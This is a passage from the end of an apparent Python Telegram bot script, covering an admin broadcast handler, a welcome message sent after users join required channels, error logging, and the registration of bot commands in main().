async def handle_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_broadcast'):
        if not is_admin(update.effective_user.id):
            return
            
        message = update.message.text or update.message.caption
        if not message:
            await update.message.reply_text("❌ Invalid message.")
            return
            
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text(f"{te(5, '⏳')} Broadcasting...")
        
        success = 0
        failed = 0
        for uid in users:
            try:
                await context.bot.send_message(uid, message, parse_mode='HTML')
                success += 1
            except Exception:
                failed += 1
                
        await update.message.reply_text(
            f"{te(6, '✅')} <b>Broadcast Complete!</b>\n\n"
            f"{te(7, '📈')} <b>Success:</b> <code>{success}</code>\n"
            f"{te(8, '❌')} <b>Failed:</b> <code>{failed}</code>",
            parse_mode='HTML'
        )

async def chat_member_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.chat_member:
        new_member = update.chat_member.new_chat_member
        if new_member.status in ['member', 'administrator', 'creator']:
            user_id = new_member.user.id
            if await check_force_sub(user_id, context.bot):
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"{te(2, '🎉')} <b>Welcome!</b>\n\n{te(3, '✨')} You have successfully joined all channels. Enjoy the bot!",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.warning(f"Update {update} caused error {context.error}")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", start_check))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("reset", reset_stats))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("help", show_help))
    
    # Admin Commands
    application.add_handler(CommandHandler("addchannel", add_channel))
    application.add_handler(CommandHandler("removechannel", remove_channel))
    application.add_handler(CommandHandler("channels", list_channels))
    application.add_handler(CommandHandler("broadcast", broadcast_command))

    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Auto-detect channel joins
    application.add_handler(ChatMemberHandler(chat_member_handler, ChatMemberHandler.CHAT_MEMBER))

    application.add_handler(MessageHandler(
        filters.TEXT | filters.Document.ALL, 
        handle_message
    ))

    application.add_error_handler(error_handler)

    print("🤖 Bot started! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
```